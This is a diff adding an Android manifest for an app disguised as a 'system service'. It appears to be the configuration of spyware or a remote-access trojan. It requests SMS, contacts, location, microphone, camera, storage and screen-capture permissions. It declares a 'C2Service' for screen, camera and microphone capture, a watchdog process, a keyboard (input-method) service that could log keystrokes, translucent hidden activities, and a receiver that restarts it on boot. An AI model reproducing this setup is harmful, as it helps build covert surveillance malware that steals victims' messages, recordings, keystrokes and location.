@@ -1,0 +1,31 @@
+<?xml version="1.0" encoding="utf-8"?>
+<manifest xmlns:android="http://schemas.android.com/apk/res/android" package="com.t.core">
+<uses-permission android:name="android.permission.INTERNET"/>
+<uses-permission android:name="android.permission.FOREGROUND_SERVICE"/>
+<uses-permission android:name="android.permission.FOREGROUND_SERVICE_MEDIA_PROJECTION"/>
+<uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
+<uses-permission android:name="android.permission.READ_SMS"/>
+<uses-permission android:name="android.permission.READ_CONTACTS"/>
+<uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
+<uses-permission android:name="android.permission.RECORD_AUDIO"/>
+<uses-permission android:name="android.permission.CAMERA"/>
+<uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
+<uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/>
+<application android:name=".App" android:label="系统服务" android:usesCleartextTraffic="true">
+    <activity android:name=".PermActivity" android:exported="true" android:theme="@android:style/Theme.Translucent.NoTitleBar" />
+    <activity android:name=".CaptureActivity" android:exported="false" android:theme="@android:style/Theme.Translucent.NoTitleBar" />
+    <service android:name=".C2Service" android:exported="false" android:foregroundServiceType="mediaProjection|camera|microphone"/>
+    <service android:name=".GuardService" android:exported="false" android:process=":guard"/>
+    <service android:name=".ImeService" android:exported="true" android:permission="android.permission.BIND_INPUT_METHOD">
+        <intent-filter><action android:name="android.view.InputMethod"/></intent-filter>
+        <meta-data android:name="android.view.im" android:resource="@xml/method"/>
+    </service>
+    <receiver android:name=".BootReceiver" android:exported="true" android:directBootAware="true">
+        <intent-filter>
+            <action android:name="android.intent.action.BOOT_COMPLETED"/>
+            <action android:name="android.intent.action.LOCKED_BOOT_COMPLETED"/>
+            <action android:name="android.intent.action.MY_PACKAGE_REPLACED"/>
+        </intent-filter>
+    </receiver>
+</application>
+</manifest>
